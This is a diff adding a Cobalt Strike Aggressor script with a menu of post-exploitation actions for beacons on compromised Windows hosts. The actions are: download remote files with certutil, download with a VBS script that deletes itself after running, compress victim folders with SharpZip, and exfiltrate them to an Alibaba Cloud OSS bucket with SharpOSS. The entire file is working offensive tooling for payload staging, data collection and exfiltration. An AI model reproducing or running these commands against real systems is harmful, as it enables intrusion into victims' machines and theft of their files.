@@ -1,0 +1,65 @@
+menu "Auxiliary module" {
+  item "certutil download file" {
+    $bid = $1['@'];
+    $dialog = dialog("certutil remote download", %(url => "http://xxxx", path => "C:\\Users\\Public\\a", bid => $bid), &certutil);
+    dialog_description($dialog, "certutil command remote file download.");
+    drow_text($dialog, "url", "Remote file address: ");
+    drow_text($dialog, "path", "Local storage location: ");
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+  }
+  sub certutil {
+    $url = $3['url'];
+    $path = $3['path'];
+    bshell($bid, "certutil.exe -urlcache -split -f $url $path");
+  }
+
+  item "vbs download file" {
+    $bid = $1['@'];
+    $dialog = dialog("vbs download file", %(url => "http://xxxx", path => "C:\\Users\\Public\\a", bid => $bid), &vbs);
+    dialog_description($dialog, "vbs script remote download file, command line parameter, automatic clear vbs download script after execution.");
+    drow_text($dialog, "url", "remote file address: ");
+    drow_text($dialog, "path", "local storage file: ");
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+  }
+  sub vbs {
+    $url = $3['url'];
+    $path = $3['path'];
+    bupload($bid, script_resource("/scripts/Auxiliary/download.vbs"));
+    bshell($bid, "download.vbs $url $path");
+    bshell($bid, "del /f /s /q download.vbs");
+  }
+
+  item "SharpZip (compressed folder)" {
+    $bid = $1['@'];
+    $dialog = dialog("SharpZip compressed package file", %(file => "C:\\Users\\Public", path => "C:\\Users\\Public.zip", bid => $bid), &SharpZip);
+    drow_text($dialog, "file", "file: ");
+    drow_text($dialog, "path", "path: ");
+    dialog_description($dialog, "Compress and package directories or files. Project address: https://github.com/uknowsec/SharpZip");
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+  }
+  sub SharpZip {
+    $arg = join('', @("$3['file'] $3['path']"));
+    bexecute_assembly($bid, script_resource("/scripts/Auxiliary/SharpZip.exe"), $arg);
+  }
+
+  item "SharpOSS(Upload file)" {
+    $bid = $1['@'];
+    $dialog = dialog("SharpOSS", %(bucketName => "", accessKeyId => "", accessKeySecret => "", endpoint => "oss-cn-chengdu.aliyuncs.com", UploadFilePath => "C:\\Users\\Public\\bak.zip", bid => $bid), &SharpOSS);
+    dialog_description($dialog, "Use aliyun-oss-csharp-sdk to quickly upload target system files to Alibaba Cloud OSS. Project address: https://github.com/uknowsec/SharpOSS");
+    drow_text($dialog, "bucketName", "BucketName: ");
+    drow_text($dialog, "accessKeyId", "AccessKeyId: ");
+    drow_text($dialog, "accessKeySecret", "AccessKeySecret: ");
+    drow_text($dialog, "endpoint", "Endpoint: ");
+    drow_text($dialog, "UploadFilePath", "UploadFilePath: ");
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+  }
+  sub SharpOSS {
+    $bucketName = $3['bucketName'];
+    $accessKeyId = $3['accessKeyId'];
+    $accessKeySecret = $3['accessKeySecret']; $endpoint = $3['endpoint']; $UploadFilePath = $3['UploadFilePath']; $arg = join(' ', @($3['bucketName'],$3['accessKeyId'],$3['accessKeySecret'],$3['endpoint'],$3['UploadFilePath'])); bexecute_assembly($bid, script_resource("/scripts/Auxiliary/SharpOSS.exe"), $arg); 
+  } 
+}
